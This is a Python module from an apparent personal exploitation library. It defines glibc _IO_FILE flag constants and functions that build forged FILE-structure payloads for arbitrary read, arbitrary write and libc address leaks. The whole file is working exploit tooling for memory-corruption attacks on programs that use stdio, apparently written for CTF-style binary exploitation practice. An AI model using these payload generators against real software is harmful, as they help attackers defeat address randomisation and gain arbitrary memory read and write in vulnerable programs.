from mypwn.mypwnlib.Exception.myExcept import *
from mypwn.mypwnlib.pwnfunc.pwnfunc import *
iofile_flag={
    '_IO_MAGIC':0xFBAD0000,
    '_OLD_STDIO_MAGIC':0xFABC0000,
    '_IO_MAGIC_MASK':0xFFFF0000,
    '_IO_USER_BUF':1,
    '_IO_UNBUFFERED':2,
    '_IO_NO_READS':4,                     # zhongyao
    '_IO_NO_WRITES':8,
    '_IO_EOF_SEEN':0x10,
    '_IO_ERR_SEEN':0x20,
    '_IO_DELETE_DONT_CLOSE':0x40,
    '_IO_LINKED':0x80,
    '_IO_IN_BACKUP':0x100,                 ## zhongyao 
    '_IO_LINE_BUF':0x200,
    '_IO_TIED_PUT_GET':0x400,
    '_IO_CURRENTLY_PUTTING':0x800,         # zhongyao
    '_IO_IS_APPENDING':0x1000,             
    '_IO_IS_FILEBUF':0x2000,
    '_IO_BAD_SEEN':0x4000,
    '_IO_USER_LOCK':0x8000
}

iofile_ptr_key=[
    'read_ptr','read_end','read_base',
    'write_base','write_ptr','write_end',
    'buf_base','buf_end',
    '_maker','_chain',
    '_fileno'
]

def ioread_payload(buf_base,buf_end,flags=0xfbad0000,fileno=0,show_payload=0):
    """
        gen fread attack payload
    """
    if show_payload:
        print('~_IO_NO_READS, ~_IO_IN_BACKUP, ~_IO_CURRENTLY_PUTTING')
        print('read_ptr == read_end')
        print('buf_end-buf_base > size_read')
        print('buf_base--buf_end')
        print('write_ptr<=write_base')
        print('fileno')

    if flags!=0xfbad0000:
        flags=flags & ~iofile_flag.get('_IO_NO_READS')
        flags=flags & ~iofile_flag.get('_IO_IN_BACKUP')
        flags=flags & ~iofile_flag.get('_IO_CURRENTLY_PUTTING')
    read_base=read_ptr=read_end=buf_base
    write_ptr=write_base=write_end=buf_base
    _markers=0
    _chain=0

    ret_payload=p64(flags)
    ret_payload+=pack_num(read_ptr)+pack_num(read_end)+pack_num(read_base)
    ret_payload+=pack_num(write_base)+pack_num(write_ptr)+pack_num(write_end)
    ret_payload+=pack_num(buf_base)+pack_num(buf_end)

    if fileno!=0:
        ret_payload+=pack_num(_markers)
        ret_payload+=pack_num(_chain)
        ret_payload+=pack_num(fileno)
    return ret_payload
    
def iowrite_payload(write_base,write_ptr,flags=0xfbad1000,fileno=1,show_payload=0):
    """
        gen frwite attack payload
        attention:
            if can, do not change buf_base and buf_end !!!!!!!!!
    """
    if show_payload:
        print('_IO_CURRENTLY_PUTTING')
        print('write_base--write_ptr')
        print('read_end==write_base or flags set' )
        print('fileno')

    if flags & 0x800==0:
        flags=flags | 0x800

    buf_base=write_base
    buf_end=write_ptr

    read_ptr=read_end=read_base=buf_base
    write_end=write_ptr
    _markers=0
    _chain=0

    ret_payload=p64(flags)
    ret_payload+=pack_num(read_ptr)+pack_num(read_end)+pack_num(read_base)
    ret_payload+=pack_num(write_base)+pack_num(write_ptr)+pack_num(write_end)
    if fileno!=1:
        ret_payload+=pack_num(buf_base)+pack_num(buf_end)
        ret_payload+=pack_num(_markers)
        ret_payload+=pack_num(_chain)
        ret_payload+=pack_num(fileno)
    return ret_payload


def ioleak(flags=0xfbad1000,over_payload='\x00'):
    """
        gen the payload that can leak libc using iofile output function
            1. it just overflow the low bit of write_base
        ioleak(flags=0xfbad1000,over_payload='\x00')
    """
    if flags & 0x800==0:
        flags=flags | 0x800

    if flags & 0x1000==0:
        flags=flags | 0x1000

    read_base=read_ptr=read_end=0

    payload=p64(flags)
    payload+=pack_num(read_ptr)+pack_num(read_end)+pack_num(read_base)
    payload+=over_payload
    return payload